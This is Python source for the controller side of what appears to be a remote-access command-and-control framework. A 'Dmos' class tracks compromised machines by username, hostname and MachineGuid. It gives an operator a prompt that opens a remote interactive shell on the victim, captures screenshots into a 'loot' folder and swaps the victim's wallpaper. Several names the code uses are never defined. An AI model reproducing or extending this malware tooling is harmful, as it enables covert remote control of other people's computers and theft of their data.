import sys, os, threading, time, subprocess
from hashlib import md5
from termcolor import colored
from lib.helper import *
from lib.debug import Debug

class Dmos:
    def __init__(self, basic, sysinfo, global_addr, conn, c2):
        # basic
        self.GLOBAL         = global_addr
        self.LOCAL          = basic["local_addr"]
        self.USERNAME       = basic["user_name"]
        # sys
        self.HOSTNAME       = sysinfo["HOSTNAME"]
        self.OS             = sysinfo["OS"]
        self.ARCH           = sysinfo["ARCH"]
        self.MGUID          = sysinfo["MGUID"]
        # unique hash generated from MachineGuid in Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
        self.md5_hash       = md5(self.MGUID.encode()).hexdigest()
        self.born           = colored(ctime(), 'yellow')
        self.conn           = conn
        self.interactive    = False
        self.c2             = c2


    @safe_exec
    def interact(self):
        conn = self.conn
        modules_multi = self.c2.modules_multi
        while 1:
            command = input(colored("[{}@{}]>> ".format(self.USERNAME, self.GLOBAL), 'cyan', attrs=['bold']))
            cmd = command.split(' ')[0]
            args = command[len(cmd)+1:]

            if cmd in modules_multi.keys():
                modules_multi[cmd]._exec(self, args)
            elif command == "free":
                dmos.free_dmos()
                terminate(conn, self.c2.multi_handler.dmoss, self, "gracefully")
                break
            elif command == "shell":
                self.interactive_shell()
            elif command == "sysinfo":
                self.system_info()
            elif command == "fat":
                self.send(command.encode())
            elif command[:9] == "bgchange ":
                a, path = command.split(' ')
                self.background_changer(path)
            elif command == "clear":
                os.system("clear")
            elif command == "b":
                self.c2.multi_handler.cmdline()
                pass

    def free_dmos(self):
        self.conn.send("free".encode())
    def transfer(self, conn):
        """
        Macro function for interactive shell
        """
        Debug.tprint("""type "exit" to terminate the spawned shell (press enter to continue...)""")

        while self.interactive == True:
            try:
                buffer = conn.recv(0x400)
                sys.stdout.write(buffer.decode())
                sys.stdout.flush()
            except:
                interactive = False
    def interactive_shell(self):
        self.conn.send("shell".encode())

        self.interactive = True
        t = threading.Thread(target=self.transfer, args=(self.conn, ))
        t.start()
        while True:
            command = input().encode()
            if command == b"exit":
                self.conn.send(command + b"\n")
                self.interactive = False
                time.sleep(0.125)
                break
            self.conn.send(command + b"\n")

    def system_info(self):
        print("GLOBAL   : " + self.GLOBAL)
        print("LOCAL    : " + self.LOCAL)
        print("USERNAME : " + self.USERNAME)
        print("HOSTNAME : " + self.HOSTNAME)
        print("OS       : " + self.OS)
        print("ARCH     : " + self.ARCH)
        print("MGUID    : " + self.MGUID)
        print("HASH     : " + self.md5_hash)
        print("BORN     : " + self.born)
    def screenshot(self):
        self.conn.send("screenshot".encode())
        # TODO: just fix this shit to be multi plat
        DATE = subprocess.check_output("date", shell=True).rstrip(b'\n').decode("utf-8") + ".png"
        path = os.path.join("./loot/screenshots/", DATE)

        f = open(path, "wb")
        image_data = b''
        while b'FIN' not in (d := self.conn.recv(1024)): #FIN
            image_data += d
        f.write(image_data)
        f.close()
    def background_changer(self, image_path):
         self.conn.send("bgchange".encode())
         self.conn.send("test_image.png".encode())
         progress = tqdm.tqdm(range(os.path.getsize(image_path)), f"Sending {image_path}", unit="B", unit_scale=True, unit_divisor=1024)
         with open(image_path, 'rb') as f:
             for _ in progress:
                 data = f.read(1024)
                 if not data:
                     break
                 self.conn.sendall(data)
                 progress.update(len(data))
         f.close()
         self.conn.send("FIN".encode())
